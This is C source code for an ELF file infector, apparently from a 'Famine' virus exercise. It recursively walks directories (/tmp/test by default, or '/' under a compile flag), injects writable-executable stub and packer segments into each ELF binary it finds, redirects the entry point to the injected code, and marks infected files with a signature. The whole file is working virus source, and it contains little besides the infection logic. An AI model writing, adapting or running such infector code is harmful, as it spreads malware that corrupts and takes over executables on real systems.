// ---
// Includes
// ---


#include <dirent.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "elf_reader.h"
#include "utils.h"
#include "protect_range.h"
#include "stub/32/stub_def.h"
#include "stub/64/stub_def.h"
#include "stub/packer32/packer_def.h"
#include "stub/packer64/packer_def.h"

#define BUF_SIZE	(32 * 1024)
#define PATH_INIT	4096

// ---
// Static variables
// ---

static const char	*_stub32_bin_start;
static const char	*_stub32_bin_end;
static const char	*_stub64_bin_start;
static const char	*_stub64_bin_end;

static const char	*_packer32_bin_start;
static const char	*_packer32_bin_end;
static const char	*_packer64_bin_start;
static const char	*_packer64_bin_end;

// ---
// Typedefs
// ---

typedef enum {
	PHT_IDX_STUB,
	PHT_IDX_STUB32_LOAD,
	PHT_IDX_STUB64_LOAD,
	PHT_IDX_PACKER,
	PHT_IDX_PACKER_PROTECTED_RANGES,
	PHT_IDX_PACKER_BSS_RANGES,
	PHT_IDX_PACKER32_LOAD,
	PHT_IDX_PACKER64_LOAD,
	PHT_IDX__NB,
}	e_pht_idx;

struct linux_dirent64 {
	uint64_t	d_ino;
	int64_t		d_off;
	uint16_t	d_reclen;
	uint8_t		d_type;
	char		d_name[];
};

typedef void (*t_file_cb)(const char *path, void *ctx);

typedef struct {
	char	*data;
	size_t	size;
} t_buf;

// ---
// Static function declarations
// ---

static void				_inject(
							t_elf_file *s,
							size_t first_entry_index,
							int interp_idx,
							t_ranges *bss_ranges,
							t_ranges *protected_ranges);

static void				_pack(
							t_elf_file *s,
							size_t first_entry_index,
							t_ranges *bss_ranges,
							t_ranges *protected_ranges);

static void				_populate_stub_data(
							t_elf_file *s,
							size_t first_entry_index,
							int interp_idx);

static void				_populate_packer_data(
							t_elf_file *s,
							size_t first_entry_index);

static void				_list_recursive(
							const char *path,
							t_file_cb cb,
							void *ctx);

// ---
// Extern function definitions
// ---

static void _infect(const char *path, void *ctx) {
	t_elf_file	s;
	int			interp_idx;
	int			first_idx;
	t_ranges	bss_ranges = list_new();
	t_ranges	protected_ranges = list_new();

	UNUSED(ctx);
	if (elf_manager_load(&s, path) == EXIT_FAILURE)
		return ;

	if (strcmp(s.data + s.size - FAMINE_SIGN_LEN, FAMINE_SIGN) == 0) {
		return ;
	}
	interp_idx = elf_find_ph_index(&s, elf_ph_is_interp);
	first_idx = s.hdl.eh.get.phnum(&s) + 1;
	if (interp_idx != -1)
		s.hdl.ph.set.type(&s, interp_idx, PT_NULL);
	if (elf_manager_move_pht_and_emplace_entries(&s, PHT_IDX__NB) == EXIT_FAILURE) {
		elf_manager_close(&s);
		return ;
	}

	_inject(&s, first_idx, interp_idx, &bss_ranges, &protected_ranges);
	_pack(&s, first_idx, &bss_ranges, &protected_ranges);

	if (elf_manager_finalize(&s, path) != EXIT_FAILURE) {
		verbose("infected path: %s\n", path);
	}
}

void	famine(
			const char *stub32_start,
			const char *stub32_end,
			const char *stub64_start,
			const char *stub64_end,
			const char *packer32_start,
			const char *packer32_end,
			const char *packer64_start,
			const char *packer64_end) {
	_stub32_bin_start = stub32_start;
	_stub32_bin_end = stub32_end;
	_stub64_bin_start = stub64_start;
	_stub64_bin_end = stub64_end;
	_packer32_bin_start = packer32_start;
	_packer32_bin_end = packer32_end;
	_packer64_bin_start = packer64_start;
	_packer64_bin_end = packer64_end;

#ifdef INFECT_FULL_PATH
	_list_recursive("/", _infect, nullptr);
#else
	_list_recursive("/tmp/test", _infect, nullptr);
	_list_recursive("/tmp/test2", _infect, nullptr);
#endif
}

// ---
// Static function definitions
// ---

static void	_populate_stub_data(
				t_elf_file *s,
				size_t first_entry_index,
				int interp_idx) {
	size_t		stub_idx = first_entry_index + PHT_IDX_STUB;
	size_t		stub_data_size = s->is_64 ? sizeof(t_stub_64_data) : sizeof(t_stub_32_data);

	void *stub_data = s->data
		+ s->hdl.ph.get.offset(s, stub_idx)
		+ s->hdl.ph.get.memsz(s, stub_idx)
		- stub_data_size;

	if (s->is_64) {
		t_stub_64_data *d = stub_data;
		d->stub_virt_off = s->hdl.ph.get.vaddr(s, stub_idx);
		d->entry_point = s->hdl.eh.get.entry(s);
		d->interp_idx = interp_idx;
		d->stub32_vaddr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_STUB32_LOAD);
		d->stub32_len = s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_STUB32_LOAD);
		d->stub64_vaddr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_STUB64_LOAD);
		d->stub64_len = s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_STUB64_LOAD);
		d->packer32_vaddr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER32_LOAD);
		d->packer32_len = s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_PACKER32_LOAD);
		d->packer64_vaddr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER64_LOAD);
		d->packer64_len = s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_PACKER64_LOAD);
	} else {
		t_stub_32_data *d = stub_data;
		d->stub_virt_off = s->hdl.ph.get.vaddr(s, stub_idx);
		d->entry_point = s->hdl.eh.get.entry(s);
		d->interp_idx = interp_idx;
		d->stub32_vaddr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_STUB32_LOAD);
		d->stub32_len = s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_STUB32_LOAD);
		d->stub64_vaddr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_STUB64_LOAD);
		d->stub64_len = s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_STUB64_LOAD);
		d->packer32_vaddr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER32_LOAD);
		d->packer32_len = s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_PACKER32_LOAD);
		d->packer64_vaddr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER64_LOAD);
		d->packer64_len = s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_PACKER64_LOAD);
	}
}

static void	_populate_packer_data(
				t_elf_file *s,
				size_t first_entry_index) {
	size_t		packer_idx = first_entry_index + PHT_IDX_PACKER;
	size_t		packer_data_size = s->is_64 ? sizeof(t_packer_64_data) : sizeof(t_packer_32_data);

	void *packer_data = s->data
		+ s->hdl.ph.get.offset(s, packer_idx)
		+ s->hdl.ph.get.memsz(s, packer_idx)
		- packer_data_size;

	if (s->is_64) {
		t_packer_64_data *d = packer_data;
		d->packer_virt_off = s->hdl.ph.get.vaddr(s, packer_idx);
		d->entry_point = s->hdl.eh.get.entry(s);
	} else {
		t_packer_32_data *d = packer_data;
		d->packer_virt_off = s->hdl.ph.get.vaddr(s, packer_idx);
		d->entry_point = s->hdl.eh.get.entry(s);
	}
}

static void	_inject(
				t_elf_file *s,
				size_t first_entry_index,
				int interp_idx,
				t_ranges *bss_ranges,
				t_ranges *protected_ranges) {
	const char	*stub_start;
	const char	*stub_end;
	const char	*stub_load_start;
	const char	*stub_load_end;
	const char	*packer_start;
	const char	*packer_end;
	const char	*packer_load_start;
	const char	*packer_load_end;

	stub_start = s->is_64 ? _stub64_bin_start : _stub32_bin_start;
	stub_end = s->is_64 ? _stub64_bin_end : _stub32_bin_end;
	stub_load_start = !s->is_64 ? _stub64_bin_start : _stub32_bin_start;
	stub_load_end = !s->is_64 ? _stub64_bin_end : _stub32_bin_end;
	packer_start = s->is_64 ? _packer64_bin_start : _packer32_bin_start;
	packer_end = s->is_64 ? _packer64_bin_end : _packer32_bin_end;
	packer_load_start = !s->is_64 ? _packer64_bin_start : _packer32_bin_start;
	packer_load_end = !s->is_64 ? _packer64_bin_end : _packer32_bin_end;

	verbose("getting protected ranges...");
	if (!elf_get_protected_ranges(s, protected_ranges))
		return ;
	range_aggregate(protected_ranges);
	verbose("%zu found !\n", protected_ranges->len);

	verbose("getting bss ranges...");
	if (!elf_get_bss_vaddr_ranges(s, bss_ranges))
		return ;
	verbose("%zu found !\n", bss_ranges->len);

	verbose("append stub...");
	elf_append_loadable_data_and_locate(s, stub_start, stub_end - stub_start, 0x1000, 0x20, first_entry_index + PHT_IDX_STUB, PF_X | PF_R | PF_W);
	verbose("done !\n");

	verbose("append stub load...");
	elf_append_loadable_data_and_locate(s, stub_load_start, stub_load_end - stub_load_start,
									0x1000, 0x20, first_entry_index + (s->is_64 ? PHT_IDX_STUB32_LOAD : PHT_IDX_STUB64_LOAD), PF_R);
	verbose("done !\n");

	elf_append_loadable_data(s,
						s->hdl.ph.get.offset(s, first_entry_index + PHT_IDX_STUB),
						s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_STUB),
						0x1000, first_entry_index + (s->is_64 ? PHT_IDX_STUB64_LOAD : PHT_IDX_STUB32_LOAD), PF_R);

	verbose("append packer...");
	elf_append_loadable_data_and_locate(s, packer_start, packer_end - packer_start, 0x1000, 0x20, first_entry_index + PHT_IDX_PACKER, PF_X | PF_R | PF_W);
	verbose("done !\n");

	list_push(protected_ranges, MAKE_RANGE(0, 0));

	verbose("append protected ranges...");
	elf_append_loadable_data_and_locate(s,
		protected_ranges->data, protected_ranges->len * sizeof(*protected_ranges->data), 0x1000, 0x20, first_entry_index + PHT_IDX_PACKER_PROTECTED_RANGES, PF_R);
	verbose("done !\n");

	verbose("append bss ranges...");
	elf_append_loadable_data_and_locate(s,
		bss_ranges->data, (bss_ranges->len) * sizeof(*bss_ranges->data), 0x1000, 0x20, first_entry_index + PHT_IDX_PACKER_BSS_RANGES, PF_R);
	verbose("done !\n");

	verbose("append packer load...");
	elf_append_loadable_data_and_locate(s, packer_load_start, packer_load_end - packer_load_start,
									0x1000, 0x20, first_entry_index + (s->is_64 ? PHT_IDX_PACKER32_LOAD : PHT_IDX_PACKER64_LOAD), PF_R);
	verbose("done !\n");

	elf_append_loadable_data(s,
						s->hdl.ph.get.offset(s, first_entry_index + PHT_IDX_PACKER),
						s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_PACKER),
						0x1000, first_entry_index + (s->is_64 ? PHT_IDX_PACKER64_LOAD : PHT_IDX_PACKER32_LOAD), PF_R);

	verbose("populating stub data...");
	_populate_stub_data(s, first_entry_index, interp_idx);
	verbose("done !\n");

	s->hdl.eh.set.entry(s, s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_STUB));

	verbose("populating packer data...");
	_populate_packer_data(s, first_entry_index);
	verbose("done !\n");

	list_push(protected_ranges, MAKE_RANGE(s->hdl.ph.get.offset(s, first_entry_index + PHT_IDX_PACKER), s->hdl.ph.get.offset(s, first_entry_index + PHT_IDX_PACKER_BSS_RANGES) + s->hdl.ph.get.memsz(s, first_entry_index + PHT_IDX_PACKER_BSS_RANGES) - s->hdl.ph.get.offset(s, first_entry_index + PHT_IDX_PACKER)));
	range_aggregate(protected_ranges);

	s->hdl.eh.set.entry(s, s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER));
}

static void	_pack(
				t_elf_file *s,
				size_t first_entry_index,
				t_ranges *bss_ranges,
				t_ranges *protected_ranges) {
	const char	*packer_start;
	const char	*packer_end;
	const char	*packer_load_start;
	const char	*packer_load_end;

	packer_start = s->is_64 ? _packer64_bin_start : _packer32_bin_start;
	packer_end = s->is_64 ? _packer64_bin_end : _packer32_bin_end;
	packer_load_start = !s->is_64 ? _packer64_bin_start : _packer32_bin_start;
	packer_load_end = !s->is_64 ? _packer64_bin_end : _packer32_bin_end;

	verbose("append packer...");
	elf_append_loadable_data_and_locate(s, packer_start, packer_end - packer_start, 0x1000, 0x20, first_entry_index + PHT_IDX_PACKER, PF_X | PF_R | PF_W);
	verbose("done !\n");

	verbose("append packer load...");
	elf_append_loadable_data_and_locate(s, packer_load_start, packer_load_end - packer_load_start,
									0x1000, 0x20, first_entry_index + (s->is_64 ? PHT_IDX_PACKER32_LOAD : PHT_IDX_PACKER64_LOAD), PF_R);
	verbose("done !\n");

	elf_append_loadable_data(s,
						s->hdl.ph.get.offset(s, first_entry_index + PHT_IDX_PACKER),
						s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_PACKER),
						0x1000, first_entry_index + (s->is_64 ? PHT_IDX_PACKER64_LOAD : PHT_IDX_PACKER32_LOAD), PF_R);

	verbose("populating packer data...");
	_populate_packer_data(s, first_entry_index);
	verbose("done !\n");

	s->hdl.eh.set.entry(s, s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER));
}

static t_buf __buf_new(
				size_t size) {
	return (t_buf){
		mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0),
		size
	};
}

static void __buf_free(
				t_buf *b) {
	munmap(b->data, b->size);
}

static void __buf_grow(
				t_buf *b,
				size_t need) {
	if (need <= b->size)
		return;
	size_t new_size = b->size;
	while (new_size < need)
		new_size <<= 1;
	b->data = mremap(b->data, b->size, new_size, MREMAP_MAYMOVE);
	b->size = new_size;
}

static void __buf_append(
				t_buf *b,
				size_t *used,
				const char *data,
				size_t len) {
	__buf_grow(b, *used + len);
	memcpy(b->data + *used, data, len);
	*used += len;
}

static void __walk(
				size_t base_len,
				t_buf *dbuf,
				t_buf *pbuf,
				t_file_cb cb,
				void *ctx) {
	pbuf->data[base_len] = '\0';
	int fd = open(pbuf->data, O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		return;

	t_buf subdirs = __buf_new(4096);
	size_t subdirs_used = 0;
	ssize_t n;

	while ((n = getdents64(fd, dbuf->data, dbuf->size)) > 0) {
		for (ssize_t pos = 0; pos < n;) {
			struct linux_dirent64 *d = (struct linux_dirent64 *)(dbuf->data + pos);

			if (d->d_name[0] != '.' ||
				(d->d_name[1] && (d->d_name[1] != '.' || d->d_name[2]))) {

				size_t name_len = strlen(d->d_name);
				size_t full_len = base_len + 1 + name_len;
				__buf_grow(pbuf, full_len + 1);

				pbuf->data[base_len] = '/';
				memcpy(pbuf->data + base_len + 1, d->d_name, name_len + 1);

				if (d->d_type == DT_DIR)
					__buf_append(&subdirs, &subdirs_used, d->d_name, name_len + 1);
				else
					cb(pbuf->data, ctx);
			}
			pos += d->d_reclen;
		}
	}
	close(fd);

	size_t off = 0;
	while (off < subdirs_used) {
		const char *name = subdirs.data + off;
		size_t name_len = strlen(name);
		size_t full_len = base_len + 1 + name_len;

		__buf_grow(pbuf, full_len + 1);
		pbuf->data[base_len] = '/';
		memcpy(pbuf->data + base_len + 1, name, name_len + 1);

		__walk(full_len, dbuf, pbuf, cb, ctx);
		off += name_len + 1;
	}

	__buf_free(&subdirs);
}

static void _list_recursive(const char *path, t_file_cb cb, void *ctx) {
	t_buf dbuf = __buf_new(BUF_SIZE);
	t_buf pbuf = __buf_new(PATH_INIT);

	size_t len = strlen(path);
	while (len > 1 && path[len - 1] == '/')
		len--;
	__buf_grow(&pbuf, len + 1);
	memcpy(pbuf.data, path, len);
	pbuf.data[len] = '\0';

	__walk(len, &dbuf, &pbuf, cb, ctx);
	__buf_free(&dbuf);
	__buf_free(&pbuf);
}
